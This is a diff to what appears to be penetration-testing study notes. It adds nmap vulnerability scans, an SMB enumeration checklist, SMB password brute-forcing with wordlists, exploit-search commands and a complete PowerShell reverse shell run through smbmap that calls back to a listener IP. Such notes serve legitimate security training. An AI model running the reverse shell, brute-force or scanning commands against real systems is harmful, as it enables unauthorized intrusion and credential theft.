@@ -72,21 +72,16 @@ nmap -sn 10.11.1.0/24
 #### TCP Connect Scan
 - The TCP connect scan in Nmap is the alternative TCP scan to use when a SYN scan is not an option.  
 - TCP connect scan should be used when nmap does not have raw packet privileges which is required for a SYN scan.
-- TCP complete performs the entire 3 way handshake.
-- SLOW!
 ````
 nmap -sT [target host]
 ````
 #### TCP SYN Scan
-- The TCP SYN scan is usually the best scan option in most cases and is known as the ‘stealthy port scan.’
 - Does not complete the 3 way handshake
 ````
 nmap -sS [target host]
 ````
 #### UDP Port Scanning
 - Always check for UDP ports will pick up DNS, NTP, SNMP 
-- Check top 100 ports with the `-F` option.
-- Generally much slower than TCP scanning 
 ````
 nmap -sU [target host]
 nmap -sU -F [target host]
@@ -134,6 +129,18 @@ nmap --script=[script name] [target host]
 - The following command executes a script names http-robots.txt on port 80:
 ````
 nmap --script=http-robots.txt.nse [target host]
+````
+## Vulnerability Scanning
+- Good nmap command
+````
+nmap -T4 -n -sC -sV -p- -oN nmap-versions --script='*vuln*' [ip]
+````
+````
+nmap -p 80 --script=all $ip - Scan a target using all NSE scripts. May take an hour to complete.
+nmap -p 80 --script=*vuln* $ip - Scan a target using all NSE vuln scripts.
+nmap -p 80 --script=http*vuln* $ip  - Scan a target using all HTTP vulns NSE scripts.
+nmap -p 21 --script=ftp-anon $ip/24 - Scan entire network for FTP servers that allow anonymous access.
+nmap -p 80 --script=http-vuln-cve2010-2861 $ip/24 - Scan entire network for a directory traversal vulnerability. It can even retrieve admin's password hash.
 ````
 ## SMTP Port 25 default
 ### SMTP User Enum
@@ -214,6 +221,44 @@ Netbios-dgm 138/udp
 Netbios-ssn 139/tcp #NETBIOS session service
 Netbios-ssn 139/udp
 Microsoft-ds 445/tcp #if you are using active directory
+````
+### SMB Checklist
+- Enumerate Hostname 
+````
+nmblookup -A $ip
+````
+- List Shares
+````
+smbmap -H $ip
+echo exit | smbclient -L \\\\$ip
+nmap --script smb-enum-shares -p 139,445 $ip
+````
+- Check Null Sessions
+````
+smbmap -H $ip
+rpcclient -U "" -N $ip
+smbclient \\\\$ip\\[share name]
+````
+- Check for Vulnerabilities  
+````
+nmap --script smb-vuln* -p 139,445 $ip
+````
+- Overall Scan  
+````
+enum4linux -a $ip
+````
+- Manual Inspection
+````
+smbver.sh $ip (port)
+````
+- Get a shell with smbmap
+````
+smbmap -u jsmith -p 'R33nisP!nckle' -d ABC -h 192.168.2.50 -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.153""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"' 
+````
+- Brute Force SMB
+````
+medusa -h $ip -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt
+nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt $ip  -vvvv
 ````
 ### smbmap
 - smbmap is one of the best ways to enumerate samba. smbmap allows pen-testers to run commands(given proper permissions), download and upload files, and overall is just incredibly useful for smb enumeration.
@@ -330,14 +375,6 @@ nmap -p 139,445 --script=smb-os-discovery [target ip]
 ````
 nmap -p 139,445 --script=smb-vuln* [target ip]
 nmap -p 445 [target] --script=smb-vuln-ms17-010
-````
-- If nse is missing a script that is available:
-````
-wget https://svn.nmap.org/nmap/scripts/NAME_OF_SCRIPT.nse -O /usr/share/nmap/scripts/NAME_OF_SCRIPT.nse
-````
-- Then update the database:
-````
-nmap --script-updatedb
 ````
 ## Web Servers
 - Two most common Apache, Microsoft IIS
@@ -470,5 +507,11 @@ sudo python3 setup.py install
 bfac --url http://$ip/ --level 4
 ````
 - If you manage to download a backupfile, grep for users - might be a password as well
-
-
+## Search services vulnerabilities
+````
+searchsploit --exclude=dos -t apache 2.2.3
+msfconsole; > search apache 2.2.3
+````
+## Stuck
+- https://book.hacktricks.xyz/
+- https://guide.offsecnewbie.com/
